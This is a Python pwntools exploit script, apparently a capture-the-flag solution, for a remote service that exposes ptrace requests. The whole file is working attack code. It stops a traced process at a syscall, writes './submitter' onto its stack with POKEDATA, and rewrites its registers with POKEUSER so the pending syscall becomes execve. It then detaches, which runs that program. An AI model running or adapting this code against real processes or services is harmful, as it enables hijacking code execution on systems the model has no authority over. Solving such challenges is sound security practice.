#!/usr/bin/env python3

from pwn import *
from icecream import ic
from Crypto.Util.number import bytes_to_long

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

PTRACE_TRACEME = 0
PTRACE_PEEKTEXT = 1
PTRACE_PEEKDATA = 2
PTRACE_PEEKUSER = 3
PTRACE_POKETEXT = 4
PTRACE_POKEDATA = 5
PTRACE_POKEUSER = 6
PTRACE_CONT = 7
PTRACE_KILL = 8
PTRACE_SINGLESTEP = 9
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_GETFPREGS = 14
PTRACE_SETFPREGS = 15
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_GETFPXREGS = 18
PTRACE_SETFPXREGS = 19
PTRACE_SYSCALL = 24
PTRACE_GET_THREAD_AREA = 25
PTRACE_SET_THREAD_AREA = 26
PTRACE_ARCH_PRCTL = 30
PTRACE_SYSEMU = 31
PTRACE_SYSEMU_SINGLESTEP = 32
PTRACE_SINGLEBLOCK = 33
PTRACE_SETOPTIONS = 0x4200
PTRACE_GETEVENTMSG = 0x4201
PTRACE_GETSIGINFO = 0x4202
PTRACE_SETSIGINFO = 0x4203
PTRACE_GETREGSET = 0x4204
PTRACE_SETREGSET = 0x4205
PTRACE_SEIZE = 0x4206
PTRACE_INTERRUPT = 0x4207
PTRACE_LISTEN = 0x4208
PTRACE_PEEKSIGINFO = 0x4209
PTRACE_GETSIGMASK = 0x420a
PTRACE_SETSIGMASK = 0x420b
PTRACE_SECCOMP_GET_FILTER = 0x420c
PTRACE_SECCOMP_GET_METADATA = 0x420d
PTRACE_GET_SYSCALL_INFO = 0x420e
PTRACE_GET_RSEQ_CONFIGURATION = 0x420f

def ptrace(request: int, address: int, data: int, stop=False):
    io.sendlineafter(b'send?\n', hex(request)[2:].encode())
    io.sendlineafter(b'want?\n', hex(address)[2:].encode())
    io.sendlineafter(b'data?\n', hex(data)[2:].encode())

    returned_raw = io.recvline_contains(b'returned').strip().decode().split('returned ')[1]
    returned_bytes = bytes.fromhex(returned_raw[2:].rjust(16, '0'))
    returned = unpack(returned_bytes, 64, endianness="big")
    ic(request, address, data, hex(returned))

    result = io.recvuntil(b'(0/1)?')
    io.sendline(b"0" if stop else b"1")

    if b"ptrace error" in result:
        raise Exception(result.decode())
    

    return returned



# ic(do_ptrace_raw(PTRACE_CONT, 0, b'0'))
time.sleep(1)
ptrace(PTRACE_SETOPTIONS, 0, 1) # PTRACE_O_TRACESYSGOOD
ptrace(PTRACE_SYSCALL, 0, 0)

ptrace(PTRACE_PEEKUSER, 15*8, 0)
ptrace(PTRACE_PEEKUSER, 14*8, 0)
ptrace(PTRACE_PEEKUSER, 13*8, 0)
ptrace(PTRACE_PEEKUSER, 12*8, 0)

stack_addr = ptrace(PTRACE_PEEKUSER, 152, 0)
ic(hex(stack_addr))
filename = b"./submitter\0"
filename_raw1 = bytes_to_long(filename[0:8][::-1])
filename_raw2 = bytes_to_long(filename[8:16][::-1])

ptrace(PTRACE_POKEDATA, stack_addr, filename_raw1)
ptrace(PTRACE_POKEDATA, stack_addr+8, filename_raw2)
ptrace(PTRACE_POKEDATA, stack_addr+0x40, 0)
ptrace(PTRACE_POKEDATA, stack_addr+0x48, 0)
ptrace(PTRACE_POKEUSER, 15*8, 59)
ptrace(PTRACE_POKEUSER, 14*8, stack_addr)
ptrace(PTRACE_POKEUSER, 13*8, stack_addr+0x40)
ptrace(PTRACE_POKEUSER, 12*8, stack_addr+0x40)

# ptrace(PTRACE_SYSCALL, 0, 0)
# ptrace(PTRACE_CONT, 0, 0)
ptrace(PTRACE_DETACH, 0, 0)

print(io.recvall(timeout=3).decode())
